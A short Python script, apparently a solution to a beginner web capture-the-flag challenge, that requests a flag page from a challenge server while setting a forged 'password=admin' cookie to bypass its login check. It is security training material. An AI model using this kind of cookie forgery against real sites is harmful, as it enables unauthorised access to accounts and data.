import requests

url = "http://web-05.challs.olicyber.it/flag"

print(requests.get(url, cookies={"password" : "admin"}).text)